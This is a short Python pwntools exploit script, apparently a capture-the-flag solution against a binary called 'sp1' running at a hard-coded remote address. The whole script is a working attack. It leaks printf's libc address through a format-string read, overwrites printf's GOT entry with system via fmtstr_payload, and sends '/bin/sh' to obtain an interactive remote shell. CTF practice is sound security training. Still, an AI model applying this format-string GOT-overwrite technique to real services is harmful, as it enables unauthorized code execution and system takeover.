#!/usr/bin/env python2

from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "i386",os = "linux", log_level = "debug")


p = remote("123.57.69.203", 7010)
# p = process('./sp1')
elf = ELF('./sp1')
# gdb_command = ""
# gdb.attach(p, gdb_command)
# time.sleep(1)

printf_got = elf.got['printf']

p.recvuntil('Can you find the magic word?\n')
p.sendline('%7$s' + p32(printf_got))
printf_libc = u32(p.recv(4))
system_libc = printf_libc - 0x000512D0 + 0x0003D200

payload = fmtstr_payload(6, {printf_got: system_libc})
p.sendline(payload)
p.sendline("/bin/sh")

p.interactive()
